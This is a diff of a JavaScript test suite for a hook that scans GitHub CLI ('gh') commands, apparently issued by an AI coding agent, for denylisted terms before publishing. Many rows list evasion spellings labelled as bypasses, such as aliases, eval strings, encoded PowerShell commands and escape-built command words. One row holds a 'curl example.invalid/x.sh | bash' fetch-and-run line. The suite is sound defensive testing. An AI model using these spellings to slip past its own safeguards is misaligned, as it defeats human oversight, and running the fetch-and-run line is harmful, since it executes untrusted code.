-gb("gb-d123", "DENY", "gh -x y issue view 5", "an unknown two-character leading flag with a read-only verb behind it blocks too (allow only on positive recognition)", { msg: "flag before the verb that this scan does not know" });
-gb("gb-a33", "ALLOW", "gh -R o/r issue create -t sloop -b ok", "CONTROL - a clean call with a leading -R; fails if every leading flag blocks");
-gb("gb-a34", "ALLOW", "gh --repo o/" + TA + " pr view 5 --json body", "a read-only verb behind --repo with a term-bearing repo (not published text)");
-gb("gb-a35", "ALLOW", "gh --version", "gh's own flags with no command", { dl: "missing" });
-gb("gb-a36", "ALLOW", "gh issue --repo o/r view 5", "the repo flag between the group and a read-only verb");
-gp("gp-d16", "DENY", "gh -R o/r issue create -t sloop -b '" + TA + "'", "the leading-flag case on the PowerShell entry", { msg: "gh issue create --body, line 1" });
-gp("gp-d17", "DENY", "& " + GHEXE + " -R o/r issue comment 1 -b '" + TA + "'", "the call operator with a full gh.exe path and a leading flag", { msg: "gh issue comment --body, line 1" });
-gp("gp-a08", "ALLOW", "& " + GHEXE + " issue view 1", "the same call operator on a read-only verb");
+gb("DENY", "g" + BSL + NL + "h issue comment 1 -b " + TA, "a gh word split by a backslash-newline continuation", MB);
+gb("DENY", "alias g=gh; g issue comment 1 -b " + TA, "an alias for gh defined in the same command", { msg: "an alias for gh would hide" });
+gb("DENY", "gh.cmd issue comment 1 -b " + TA, "a gh.cmd shim is still gh", MB);
+gb("ALLOW", "echo done; gh issue ls --search " + TA + " | head -3", "a read in a compound command with a term-bearing search", { dl: "missing" });
 
-// The class: every spelling that puts a gh command somewhere other than the first word. Each DENY row carries a term in a body
-// (the scanner's own `--body, line 1` message pins that it was FOUND, not blocked for another reason).
-const BODYMSG = { msg: "--body, line 1" };
-gb("gb-d75", "DENY", "\"gh\" \"ISSUE\" \"Create\" -b " + TA, "the command and verb quoted, the verb in capitals", BODYMSG);
-gb("gb-d76", "DENY", "gh.exe issue create -b " + TA, "gh.exe", BODYMSG);
-gb("gb-d77", "DENY", "/usr/bin/gh issue create -b " + TA, "a full path to gh", BODYMSG);
-gb("gb-d78", "DENY", "command gh issue create -b " + TA, "behind `command`", BODYMSG);
-gb("gb-d79", "DENY", "env X=1 gh issue create -b " + TA, "behind env with an assignment", BODYMSG);
-gb("gb-d80", "DENY", "time gh issue create -b " + TA, "behind time", BODYMSG);
-gb("gb-d81", "DENY", "sudo -u me gh issue create -b " + TA, "behind sudo with a valued option", BODYMSG);
-gb("gb-d82", "DENY", "timeout 5 gh issue create -b " + TA, "behind timeout and its duration", BODYMSG);
-gb("gb-d83", "DENY", "echo 1 | xargs -I{} gh issue comment {} -b " + TA, "behind xargs", BODYMSG);
-gb("gb-d84", "DENY", "true && gh issue create -b " + TA, "after &&", BODYMSG);
-gb("gb-d85", "DENY", "true; gh issue create -b " + TA, "after ;", BODYMSG);
-gb("gb-d86", "DENY", "echo 1 | gh issue create -b " + TA, "after a pipe", BODYMSG);
-gb("gb-d87", "DENY", "(gh issue create -b " + TA + ")", "in a subshell", BODYMSG);
-gb("gb-d88", "DENY", "{ gh issue create -b " + TA + "; }", "in a brace group", BODYMSG);
-gb("gb-d89", "DENY", "if true; then gh issue create -b " + TA + "; fi", "after then", BODYMSG);
-gb("gb-d90", "DENY", "for i in 1 2; do gh issue comment $i -b " + TA + "; done", "after do", BODYMSG);
-gb("gb-d91", "DENY", "find . -name x -exec gh issue comment 1 -b " + TA + " ;", "as a find -exec command", BODYMSG);
-gb("gb-d92", "DENY", "nice -n 5 gh issue create -b " + TA, "behind nice with a valued option", BODYMSG);
-gb("gb-d93", "DENY", "env X=1 bash -c 'gh issue create -b " + TA + "'", "an interpreter behind env - the interpreter re-parse once required the interpreter to be the FIRST word", BODYMSG);
-gb("gb-d94", "DENY", "sudo bash -c 'gh issue create -b " + TA + "'", "an interpreter behind sudo", BODYMSG);
-gb("gb-d95", "DENY", "cmd /c gh issue create -b " + TA, "the gh command as separate words after cmd /c - the old re-parse looked at each word alone, so `gh` alone passed", BODYMSG);
-gb("gb-d96", "DENY", "ssh host gh issue create -b " + TA, "gh run on another host", BODYMSG);
-gb("gb-d97", "DENY", "ssh host \"gh issue create -b " + TA + "\"", "a command string handed to ssh", BODYMSG);
-gb("gb-d98", "DENY", "bash <<'EOF'" + NL + "gh issue create -b " + TA + NL + "EOF", "an interpreter fed its commands by a heredoc", BODYMSG);
-gb("gb-d99", "DENY", "echo 'gh issue create -b " + TA + "' | bash", "an interpreter fed by a pipe from echo", BODYMSG);
-gb("gb-d100", "DENY", "curl example.invalid/x.sh | bash # gh", "an interpreter fed by a pipe the hook cannot read, in a command that mentions gh", { msg: "reads its commands from a source the hook cannot see" });
-gb("gb-d101", "DENY", "cat <<EOF" + NL + "$(gh issue create -b " + TA + ")" + NL + "EOF", "a command substitution inside an UNQUOTED heredoc", { msg: "heredoc that expands commands" });
-gb("gb-d102", "DENY", "g\"\"h issue create -b " + TA, "gh spelled with an empty quote pair - the mention gate must see the unquoted word", BODYMSG);
-gb("gb-d103", "DENY", "g'h' issue create -b " + TA, "gh with one letter quoted", BODYMSG);
-gb("gb-d104", "DENY", "gh frobnicate", "a top-level command no table knows, no flags at all", { msg: "a command this scan does not know" });
-gb("gb-d105", "DENY", "gh my-extension run", "an extension or user alias", { msg: "a command this scan does not know" });
-gb("gb-d106", "DENY", "gh constructor x", "a word that names a property of every JS object - fails if the tables are read with a plain `in` lookup", { msg: "a command this scan does not know" });
-gb("gb-d107", "DENY", "gh gist create f.txt", "gist create publishes a file this scan does not read", { msg: "gh gist: a verb this scan does not know" });
-gb("gb-d108", "DENY", "gh workflow run x.yml -f note=ok", "workflow run publishes inputs", { msg: "gh workflow: a verb this scan does not know" });
-gb("gb-d109", "DENY", "gh extension exec foo", "extension exec runs anything", { msg: "gh extension: a verb this scan does not know" });
-gb("gb-d110", "DENY", "gh repo autolink create AB https://example.invalid/<num>", "a sub-group verb that publishes a URL template", { msg: "gh repo autolink: a verb this scan does not know" });
-gb("gb-d111", "DENY", "gh issue create --newflag ok -t x -b ok", "a long flag the covered verb's table does not list (it could be a text flag of a newer gh)", { msg: "a long flag this scan does not know" });
-gb("gb-d112", "DENY", "gh issue create -b ok $(echo x)", "an unquoted command substitution among the flags cannot be judged", { msg: "unquoted expansion" });
-gp("gp-d18", "DENY", "Start-Process gh -ArgumentList 'issue create -b " + TA + "'", "Start-Process: the argument string is one word, which no table places as a command", { msg: "a command this scan does not know" });
-gp("gp-d19", "DENY", "iex \"gh issue create -b '" + TA + "'\"", "Invoke-Expression of a gh command string", BODYMSG);
-gp("gp-d20", "DENY", "$u = gh issue create -t x -b '" + TA + "'", "an assignment from a gh call (the first word is a variable)", BODYMSG);
-gp("gp-d21", "DENY", "if (Test-Path x) { gh issue create -b '" + TA + "' }", "gh inside a script block after a keyword", BODYMSG);
-gp("gp-d22", "DENY", "gh frobnicate", "an unknown top-level command on the PowerShell entry", { msg: "a command this scan does not know" });
-gp("gp-d23", "DENY", "& " + GHEXE + " frobnicate", "the call operator with a full path and an unknown command", { msg: "a command this scan does not know" });
+gb("DENY", "gh api graphql -f query='mutation { addComment(input: {body: \"bows" + BSL + "u0070rit-ledger\"}) { x } }'",
+  "a GraphQL document with a backslash-u escape: the server decodes it AFTER the scan reads the text - fails if api fields are scanned only as written", { msg: "(unescaped), line 1" });
+gb("DENY", "gh api graphql -f query='mutation { a(b: \"bowsprit" + BSL + "u002dledger\") { x } }'", "the hyphen of the first term written as an escape", { msg: "(unescaped), line 1" });
+gb("DENY", "gh release create v1 --title t --notes-file clean.md './a.zip#" + TA + "'", "a release asset LABEL (path#label) is published text", { msg: "asset label, line 1" });
+gb("DENY", "gh release upload v1 './a.zip#" + TA + "'", "release upload: the same label", { msg: "asset label, line 1" });
+gb("DENY", "true && gh release upload v1 './a.zip#" + TA + "'", "a label on release upload in a compound command", MB);
+gb("ALLOW", "gh release upload v1 ./a.zip", "release upload with no label (the asset bytes are out of scope)");
+gb("DENY", "function g { gh \"$@\"; }; g issue comment 1 -b " + TA, "a shell function forwarding its arguments to gh: the gh is followed by an expansion", { msg: "not statically known" });
+gb("DENY", "trap 'gh issue comment 1 -b " + TA + "' EXIT", "trap runs a command string", { msg: "a command string that mentions gh" });
+gb("DENY", "at now <<< 'gh issue comment 1 -b " + TA + "'", "a here-string handed to a host", { msg: "reads its commands from a heredoc" });
+gb("DENY", "$SHELL -c 'gh issue comment 1 -b " + TA + "'", "a command name built from a variable, handed a command string", { msg: "followed by a gh command and verb" });
+gb("DENY", "shopt -s expand_aliases; alias g='gh'; g issue comment 1 -b " + TA, "expand_aliases plus an alias", { msg: "an alias for gh would hide" });
+gb("ALLOW", "gh pr view 9 --json body --jq .body | node scripts/x.js", "a read piped into a script: a node with a script argument is not an interpreter reading code from the pipe", { dl: "missing" });
+gb("DENY", "gh pr view 9 --json body --jq .body | node", "node reading its code from a pipe, in a command that mentions gh", { msg: "reads its commands from a heredoc" });
 
-gb("gb-a37", "ALLOW", "command -v gh >/dev/null && echo yes", "a lookup of gh itself (no command word follows it)");
-gb("gb-a38", "ALLOW", "which gh", "gh as the argument of which");
-gb("gb-a39", "ALLOW", "grep -rn gh docs/", "gh as a grep pattern followed by a path - the loose rule needs a gh command word after it", { dl: "missing" });
-gb("gb-a40", "ALLOW", "git log --oneline -n 3 -- plugins/gh", "a path ending in gh", { dl: "missing" });
-gb("gb-a41", "ALLOW", "gh auth status", "a recognised no-text command (any verb)", { dl: "missing" });
-gb("gb-a42", "ALLOW", "gh run list --limit 3 && gh run view 5 --log", "workflow runs, read-only", { dl: "missing" });
-gb("gb-a43", "ALLOW", "gh workflow list", "a recognised no-text verb of a partially covered command", { dl: "missing" });
-gb("gb-a44", "ALLOW", "gh search issues sloop --repo o/r", "search", { dl: "missing" });
-gb("gb-a45", "ALLOW", "gh status", "status", { dl: "missing" });
-gb("gb-a46", "ALLOW", "gh issue artifact list 5", "a read-only sub-group verb", { dl: "missing" });
-gb("gb-a47", "ALLOW", "gh extension list", "extension list", { dl: "missing" });
-gb("gb-a48", "ALLOW", "gh api repos/o/r/pulls/5 --jq .title", "a read-only api call", { dl: "missing" });
-gb("gb-a49", "ALLOW", "node scripts/denylist-scan.js --help # gh", "a command that merely mentions gh in a comment", { dl: "missing" });
-gb("gb-a50", "ALLOW", "git push && gh pr create --fill", "a fill-only create (text comes from commits the push already published)");
-gp("gp-a09", "ALLOW", "Get-Command gh -ErrorAction SilentlyContinue", "a PowerShell lookup of gh");
-gp("gp-a10", "ALLOW", "gh run list; gh pr checks 5", "read-only gh commands in sequence", { dl: "missing" });
+// Shapes found by a differential fuzz against real bash (a stub gh on PATH; every command in which bash ran it must be blocked)
+gb("DENY", "x='gh issue comment 1 -b " + TA + "'; $x", "a variable holding a whole gh command, then run through the variable", { msg: "a variable that holds a gh command" });
+gb("DENY", "a=(gh issue comment 1 -b " + TA + "); \"${a[@]}\"", "an array holding a gh command", { msg: "an array that holds a gh command" });
+gb("DENY", "read -r c <<< 'gh issue comment 1 -b " + TA + "'; $c", "read from a here-string, then run", { msg: "reads its commands from a heredoc" });
+gb("DENY", "cat > s.sh <<'EOF'" + NL + "gh issue comment 1 -b " + TA + NL + "EOF" + NL + "bash s.sh", "a script written and run in one call", { msg: "runs a script file in a call that also holds a gh command as text" });
+gb("DENY", "cat > s.sh <<'EOF'" + NL + "g${y}h issue comment 1 -b " + TA + NL + "EOF" + NL + "bash s.sh", "the same with an obfuscated gh word in the script", { msg: "runs a script file in a call that also holds a gh command as text" });
+gb("DENY", "source <(echo 'gh issue comment 1 -b " + TA + "')", "source of a process substitution", { msg: "reads its commands from a heredoc" });
+gb("DENY", "git -c alias.x='!gh issue comment 1 -b " + TA + "' x", "a git alias that runs gh", { msg: "a git alias" });
+gb("DENY", "case x in x) $(echo gh) issue comment 1 -b " + TA + " ;; esac", "the closing parenthesis of a case pattern ends the pattern segment", { msg: "built from an expansion" });
+gb("DENY", "echo $((1+1)); g$()h issue comment 1 -b " + TA, "an unparseable construct in a command with a glued gh word (no gh text at all) blocks", { msg: "could not parse" });
+gb("DENY", "function f { $'" + BSL + "x67h' issue comment 1 -b " + TA + "; }; f", "an ANSI-C spelled gh inside a function body", { msg: "built from an expansion" });
+gb("ALLOW", "git commit -m \"gh issue create: handle flags\"", "a commit message that is itself a gh-shaped phrase is data, not an invocation", { dl: "missing" });
 
-// Local files and alt text on covered verbs. pr create -T/--template is a FILE (starting body text); issue create -T/--template
-// is a template NAME looked up in the repo's committed templates (so nothing is read). --attach publishes the alt text after `#`
-// (the attached file's bytes are out of scope); --recover is gh's saved JSON input of a failed create.
-gb("gb-d113", "DENY", (x) => "gh pr create -t x -b ok -T " + G(x, "dirty.md"), "a pr create template FILE is scanned like a body file", { msg: "--template (file contents), line 3" });
-gb("gb-d114", "DENY", (x) => "gh pr create -t x -b ok --template=" + G(x, "dirty.md"), "the --template=file form", { msg: "--template (file contents), line 3" });
-gb("gb-d115", "DENY", (x) => "gh pr create -t x -b ok -T " + G(x, "no-such-file.md"), "an unreadable template file blocks", { msg: "unreadable" });
-gb("gb-d116", "DENY", (x) => "gh issue create -t x -b ok --recover " + G(x, "recover-dirty.json"), "a recover file holding the term (raw scan)", { msg: "--recover (file contents), line 1" });
-gb("gb-d117", "DENY", (x) => "gh pr create -t x -b ok --recover " + G(x, "recover-dirty.json"), "the same on pr create", { msg: "--recover (file contents), line 1" });
-gb("gb-d118", "DENY", (x) => "gh issue create -t x -b ok --recover " + G(x, "recover-esc.json"), "a term split by a JSON unicode escape: only the decoded strings show it - fails if only the raw file is scanned", { msg: "--recover (decoded), line " });
-gb("gb-d119", "DENY", (x) => "gh issue create -t x -b ok --recover " + G(x, "recover-bad.json"), "a recover file that is not JSON cannot be read reliably, so it blocks", { msg: "not JSON" });
-gb("gb-d120", "DENY", "gh issue create -t x -b ok --attach './p.png#alt " + TA + "'", "alt text after # is published", { msg: "--attach (alt text), line 1" });
-gb("gb-d121", "DENY", "gh pr comment 1 -b ok --attach ./a.png#" + TA, "alt text on pr comment", { msg: "--attach (alt text), line 1" });
-gb("gb-d122", "DENY", "gh issue edit 1 --attach ./a.png#" + TA, "alt text on issue edit", { msg: "--attach (alt text), line 1" });
-gb("gb-a51", "ALLOW", (x) => "gh pr create -t x -b ok -T " + G(x, "clean.md"), "a clean template file");
-gb("gb-a52", "ALLOW", "gh issue create -t x -b ok -T " + TA, "issue create -T is a template NAME (a repo-committed file, scanned by pre-push), never read here - fails if the name is scanned as text");
-gb("gb-a53", "ALLOW", (x) => "gh issue create -t x -b ok --recover " + G(x, "recover-clean.json"), "a clean recover file");
-gb("gb-a54", "ALLOW", "gh issue create -t x -b ok --attach './" + TA + ".png'", "a term only in the attached file's PATH (no # alt text): paths are never scanned");
-gb("gb-a55", "ALLOW", "gh issue create -t x -b ok --attach './a.png#clean alt'", "clean alt text");
-gb("gb-a56", "ALLOW", "gh pr create --fill-first --draft", "--fill-first: the text comes from commits the push already published");
-gb("gb-a57", "ALLOW", "gh pr create --fill-verbose -w", "--fill-verbose and -w (a browser form the hook cannot see)");
-gb("gb-a58", "ALLOW", "gh pr create -e", "-e: an interactive editor the hook cannot see");
-gb("gb-a59", "ALLOW", "gh release create v1 --generate-notes", "--generate-notes: GitHub builds the notes from merged PRs");
-gb("gb-a60", "ALLOW", "gh release create v1 --notes-from-tag -t ok", "--notes-from-tag: the tag message was pushed with the tag");
+// ===== PowerShell tool ===========================================================================
+gp("DENY", (x) => "gh issue comment 5 --body-file " + NP(x, "dirty.md"), "CONTROL - PowerShell entry, a native single-quoted path with backslashes; fails if the PowerShell tool_name is not scanned or backslashes are mangled by the bash -> node hand-off", { msg: "--body-file (file contents), line 3" });
+gp("DENY", "gh issue comment 5 -F dirty.md", "a relative path on the PowerShell entry", { msg: "(file contents), line 3" });
+gp("DENY", (x) => "gh issue comment 5 --body-file \"" + NATIVE(x, "dirty.md") + "\"", "a native backslash path in DOUBLE quotes (a backslash is literal in PowerShell)", { msg: "(file contents), line 3" });
+gp("DENY", (x) => "gh issue comment 5 --body-file " + NATIVE(x, "dirty.md"), "a bare native path", { msg: "(file contents), line 3" });
+gp("DENY", "gh issue create --title '" + TA + "' --body-file clean.md", "a single-quoted title", { msg: "gh issue create --title, line 1" });
+gp("DENY", "gh issue create --title \"" + TA + "\" --body-file clean.md", "a double-quoted title", { msg: "gh issue create --title, line 1" });
+gp("DENY", "gh issue create --title='" + TA + "' --body-file clean.md", "--title='...'", { msg: "gh issue create --title, line 1" });
+gp("DENY", "gh api repos/o/r/issues -f title='" + TA + "'", "a PowerShell gh api -f value", { msg: "gh api -f #1" });
+gp("DENY", "gh issue comment 5 --body ok", "an inline body is refused on this entry too", MI);
+gp("DENY", "gh issue create --title 'x' --body '" + TA + "'", "an inline single-quoted body", MI);
+gp("DENY", "gh pr create -dt '" + TA + "' -F clean.md", "the cluster walk on the PowerShell entry", { msg: "gh pr create --title, line 1" });
+gp("DENY", "gh issue create --title 'a " + String.fromCharCode(0x201c) + "b' --body-file clean.md",
+  "a typographic double quote inside a single-quoted string: Windows PowerShell 5.1 drops double-quote characters from a native command line (verified on 5.1 and 7.7), which could split a term", MB);
+gp("DENY", "gh issue create --title 'a \"b\"' --body-file clean.md", "an ASCII double quote inside a single-quoted string - the same hazard", MB);
+gp("DENY", "gh issue create --title \"a $b\" --body-file clean.md", "a double-quoted title holding a variable", MB);
+gp("DENY", "gh issue create --title \"a " + BT2 + "u{62} b\" --body-file clean.md", "BYPASS 9 - a backtick escape in a double-quoted string", MB);
+gp("DENY", "gh issue comment 1 -b \"" + BT2 + "u{62}owsprit-ledger\"", "BYPASS 9 - the backtick-u escape spelling the term", MB);
+gp("DENY", "gh issue comment 1 -b @\"" + NL + BT2 + "u{62}owsprit-ledger" + NL + "\"@", "BYPASS 9 - a double-quoted here-string with an escape", MB);
+gp("DENY", "gh issue comment 1 -b @'" + NL + TA + NL + "'@", "a single-quoted here-string as the body", MB);
+gp("DENY", "@'" + NL + "l1" + NL + TB + NL + "'@ | gh issue comment 5 --body-file -", "a here-string piped to --body-file -", MB);
+gp("DENY", "gh issue comment 1 --body " + BT2 + NL + "   '" + TA + "'", "BYPASS 1 - a backtick-continued --body", MB);
+gp("DENY", "gh issue comment 1 <# ' #> -b '" + TA + "' <# ' #>", "BYPASS 7 - a block comment hiding a quote", MB);
+gp("DENY", "<# ' #> gh issue create -b '" + TA + "' # '", "BYPASS 7 - a block comment hiding the opening quote of a string that swallows the gh word", MB);
+gp("DENY", "gh issue comment 1 -b (\"bowsprit-\"+\"ledger\")", "BYPASS 8 - a PowerShell string expression", MB);
+gp("DENY", "gh issue comment 1 -b ('bowsprit-' + 'ledger')", "BYPASS 8 - single-quoted pieces", MB);
+gp("DENY", "gh issue comment 5 --body (Get-Content -Raw dirty.md)", "(Get-Content -Raw file) as the body", MB);
+gp("DENY", "gh issue comment 5 --body-file $path", "a PowerShell variable as the path", MB);
+gp("DENY", "$b = 'x'; gh issue comment 5 --body $b", "a body variable", MB);
+gp("DENY", (x) => "Set-Content -Path " + NP(x, "p.md") + " -Value '" + TA + "'; gh issue comment 5 --body-file " + NP(x, "p.md"), "a file written by Set-Content in the same command", MB);
+gp("DENY", "Add-Content a.md 'bowsprit-'; Add-Content a.md 'ledger'; gh issue comment 1 -F a.md", "BYPASS 5 - Add-Content", MB);
+gp("DENY", "& \"C:" + BSL + "Program Files" + BSL + "GitHub CLI" + BSL + "gh.exe\" issue comment 5 --body-file clean.md", "the call operator with a full path to gh.exe: not the strict form", MB);
+gp("DENY", "& 'gh' issue comment 5 --body-file clean.md", "the call operator", MB);
+gp("DENY", "& ('g'+'h') issue comment 1 -b '" + TA + "'", "BYPASS 15 - the command word built by a PowerShell expression", { msg: "built from an expansion" });
+gp("DENY", "& (\"g\"+\"h\") issue comment 1 -b '" + TA + "'", "the same with double quotes", { msg: "built from an expansion" });
+gp("DENY", "pwsh -Command \"gh issue comment 1 -b '" + TA + "'\"", "BYPASS 14 - pwsh -Command with a string", { msg: "a command string that mentions gh" });
+gp("DENY", "iex \"gh issue comment 1 -b '" + TA + "'\"", "BYPASS 14 - Invoke-Expression", { msg: "a command string that mentions gh" });
+gp("DENY", "pwsh -EncodedCommand Z2ggaXNzdWUgY29tbWVudCAxIC1iIHg=", "BYPASS 14 - an encoded command (no gh word anywhere: the shape of the command is what is refused)", { msg: "-EncodedCommand hides the command" });
+gp("DENY", "Start-Process gh -ArgumentList 'issue create -b " + TA + "'", "Start-Process: the argument string is one word, which no table places as a command", { msg: "a command this scan does not know" });
+gp("DENY", "$u = gh issue create -t x -b '" + TA + "'", "an assignment from a gh call", MB);
+gp("DENY", "if (Test-Path x) { gh issue create -b '" + TA + "' }", "gh inside a script block", MB);
+gp("DENY", "gh issue edit 1 --add-assignee @me", "a bare @me splats in PowerShell, so it is not the strict form (quote it)", MB);
+gp("DENY", "gh issue create --title ok --body-file C:" + BSL + "x" + BSL, "a bare word ending in a backslash", MB);
+gp("DENY", (x) => "cd " + NP(x, "sub") + "; gh issue comment 5 --body-file b.txt", "BYPASS 13 - cd then a relative path on the PowerShell entry", { msg: "after a cd the file path must be absolute" });
+gp("DENY", "gh frobnicate", "an unknown top-level command on the PowerShell entry", { msg: "a command this scan does not know" });
+gp("DENY", "gh issue comment 5 --body-file clean.md", "CONTROL (fail closed) on the PowerShell entry - denylist missing", { dl: "missing", msg: "denylist file missing" });
+gp("DENY", "gh issue comment 5 --body-file clean.md", "CONTROL (blocks on its own errors) on the PowerShell entry - scanner absent", { scanner: "absent" });
+gp("ALLOW", (x) => "gh issue comment 5 --body-file " + NP(x, TA + "-clean.md"), "a term only in a native Windows PATH, single-quoted");
+gp("ALLOW", "gh issue comment 5 --body-file clean.md", "CONTROL - a clean relative file");
+gp("ALLOW", "gh issue comment 5 --body-file ./clean.md", "a ./ relative file");
+gp("ALLOW", "gh issue create --title 'x ok' --body-file clean.md --label should", "CONTROL - clean PowerShell text");
+gp("ALLOW", "gh issue create --title=\"x ok\" --body-file=clean.md", "the --flag=\"value\" form");
+gp("ALLOW", "gh issue edit 1 --add-assignee '@me'", "a quoted @me");
+gp("ALLOW", "gh api graphql -f query='query { viewer { login } }'", "a graphql read");
+gp("ALLOW", (x) => "cd " + NP(x, "sub") + "; gh issue comment 5 --body-file " + NP(x, "clean.md"), "cd then an absolute native path");
+gp("ALLOW", "gh issue view 5", "read-only gh with no denylist", { dl: "missing" });
+gp("ALLOW", "gh run list; gh pr checks 5", "read-only gh commands in sequence", { dl: "missing" });
+gp("ALLOW", "& \"C:" + BSL + "Program Files" + BSL + "GitHub CLI" + BSL + "gh.exe\" issue view 1", "the call operator on a read-only verb", { dl: "missing" });
+gp("ALLOW", "Get-ChildItem | Select-String \"gh\"", "gh as a search word, no gh command", { dl: "missing" });
+gp("ALLOW", "Get-Command gh -ErrorAction SilentlyContinue", "a PowerShell lookup of gh", { dl: "missing" });
+gp("DENY", "function g { gh @args }; g issue comment 1 -b '" + TA + "'", "a function forwarding @args to gh", { msg: "not statically known" });
+gp("ALLOW", "gh pr view $n --json state", "a read with a PowerShell variable argument", { dl: "missing" });
+gp("ALLOW", "$s = gh pr view 9 --json state --jq .state", "a read assigned to a variable", { dl: "missing" });
+gp("ALLOW", "if (Test-Path x) { gh pr view 1 }", "a read inside an if block", { dl: "missing" });
+gp("ALLOW", "foreach ($i in 1..3) { gh issue view $i }", "reads inside a foreach block", { dl: "missing" });
+gp("DENY", "Set-Alias g gh; g issue comment 1 -b '" + TA + "'", "an alias for gh defined in the same command", { msg: "an alias for gh would hide" });
 
 // ---------------------------------------------------------------------------------------------
 // [5] Execution - bash -c is the production path, and the only authoritative one
@@ -1933,7 +2062,79 @@ const CORRUPTIONS = [
     apply: (cmd) => lastExit2(cmd, "exit 0"),
     why: "the same fail-open wrapper on the PowerShell entry - its own DENY rows must catch it",
   },
+  // Scanner-LOGIC corruptions. The wrapper corruptions above leave the scanner alone, so they cannot show that a row is
+  // bound to a rule INSIDE it; these run a mutated copy of scripts/denylist-scan.js (mutate = [anchor, replacement], each
+  // anchor unique in the scanner) under the unchanged saved command, and the rows of that rule must fail. `pick` (a regex on
+  // a row's note) keeps each mutant to the few rows that bind the rule: a mutant that ran the whole table would cost minutes.
+  {
+    name: "scan-file-contents-unread",
+    guard: "gh-scan-bash",
+    pick: /^CONTROL - a body FILE|split across a LINE BREAK|a RELATIVE body file/,
+    direction: "DENY",
+    mutate: ["    if (raw !== null) ctx.scans.push({ label: label + \" (file contents)\", text: raw });\n  } else if (flag.k === \"input\"",
+      "    if (raw !== null) void 0;\n  } else if (flag.k === \"input\""],
+    why: "a body file is read and then never scanned - every file-contents DENY row must catch it",
+  },
+  {
+    name: "scan-inline-body-accepted",
+    guard: "gh-scan-bash",
+    pick: /^CONTROL - an inline body is refused|^an inline body with the term/,
+    direction: "DENY",
+    mutate: ["  if (flag.fileOnly) {", "  if (false) {"],
+    why: "an inline --body is no longer refused - only the rows that carry a CLEAN inline body can see it",
+  },
+  {
+    name: "scan-tier-b-publishing-allowed",
+    guard: "gh-scan-bash",
+    pick: /^COMPOUND - a clean publishing|^a publishing gh followed by another command/,
+    direction: "DENY",
+    mutate: ["if (ctx.tier === \"B\") { ctx.problems.push(\"gh \" + g + \" \" + v + \": \" + B_MSG); return; }",
+      "if (ctx.tier === \"B\") { return; }"],
+    why: "a publishing gh in a compound command is found and then allowed - the clean-text compound rows must catch it",
+  },
+  {
+    name: "scan-per-line-only",
+    guard: "gh-scan-bash",
+    pick: /split across a LINE BREAK|split at its space/,
+    direction: "DENY",
+    mutate: ["  for (const v of flat) {", "  for (const v of []) {"],
+    why: "matching sees one line at a time - the term-split-across-a-line-break rows must catch it",
+  },
+  {
+    name: "scan-no-nfkc",
+    guard: "gh-scan-bash",
+    pick: /fullwidth letters/,
+    direction: "DENY",
+    mutate: [".normalize(\"NFKC\")", ".normalize(\"NFC\")"],
+    why: "fullwidth letters are no longer folded - the fullwidth-term row must catch it",
+  },
+  {
+    name: "scan-cd-ignored",
+    guard: "gh-scan-bash",
+    pick: /^BYPASS 13 - a cd before gh/,
+    direction: "DENY",
+    mutate: ["if (ctx.cd && !absolute)", "if (false)"],
+    why: "a relative file after a cd is read against the hook cwd - the cd rows must catch it",
+  },
+  {
+    name: "scan-reads-blocked",
+    guard: "gh-scan-bash",
+    pick: /^ritual: read a PR body|^compound read-only gh|^CONTROL - a clean RELATIVE body file/,
+    direction: "ALLOW",
+    mutate: ["    if (SAFE_VERBS[g].indexOf(v) >= 0) { vet(null); return; }", "    if (SAFE_VERBS[g].indexOf(v) >= 0) { ctx.problems.push(\"mutant\"); return; }"],
+    why: "a recognised read-only verb is refused - only the ALLOW rows with a read can catch it",
+  },
 ];
+
+// A scanner-logic corruption: write the mutated scanner under the fixture dir and point the saved command's script root at it.
+function mutantApply(c, ctx) {
+  const src = fs.readFileSync(path.join(REPO_ROOT, "scripts", "denylist-scan.js"), "utf8");
+  if (src.split(c.mutate[0]).length !== 2) return null;
+  const dir = path.join(ctx.root, "mutant-" + c.name);
+  fs.mkdirSync(path.join(dir, "scripts"), { recursive: true });
+  fs.writeFileSync(path.join(dir, "scripts", "denylist-scan.js"), src.replace(c.mutate[0], () => c.mutate[1]));
+  return (cmd) => cmd.split("${CLAUDE_PROJECT_DIR:-.}").join(fwd(dir));
+}
 
 function runSelfTest(ctx) {
   say("");
@@ -1949,10 +2150,16 @@ function runSelfTest(ctx) {
     const target = live.guards[c.guard];
     const copy = JSON.parse(fs.readFileSync(PATHS[target.source], "utf8"));
     let applied = 0;
+    const apply = c.mutate ? mutantApply(c, ctx) : c.apply;
+    if (!apply) {
+      fail(c.name + ": the mutation anchor is not unique in scripts/denylist-scan.js - the scanner text moved, so this scenario proves nothing. Update its `mutate`.");
+      allProved = false;
+      continue;
+    }
     copy.hooks[eventOf(target)].forEach((entry) => {
       (entry.hooks || []).forEach((h) => {
         if (String(h.statusMessage || "").indexOf(target.match) < 0) return;
-        const corrupted = c.apply(String(h.command));
+        const corrupted = apply(String(h.command));
         // A corruption that silently did not apply would leave the guard intact and the self-test
         // would report "the runner cannot fail" - a false alarm about the wrong thing. Assert it bit.
         if (corrupted === h.command) return;
@@ -1975,7 +2182,12 @@ function runSelfTest(ctx) {
       allProved = false;
       continue;
     }
-    const mine = ROWS.filter((r) => r.guard === c.guard);
+    const mine = ROWS.filter((r) => r.guard === c.guard && (!c.pick || c.pick.test(r.note)));
+    if (!mine.length) {
+      fail(c.name + ": its `pick` matches no row - a row note moved, so this scenario proves nothing. Update its `pick`.");
+      allProved = false;
+      continue;
+    }
     say("  -- " + c.name + " (" + c.why + ")");
     const failures = runRows(mine, broken.guards, ctx);
     const rightDirection = failures.filter((f) =>
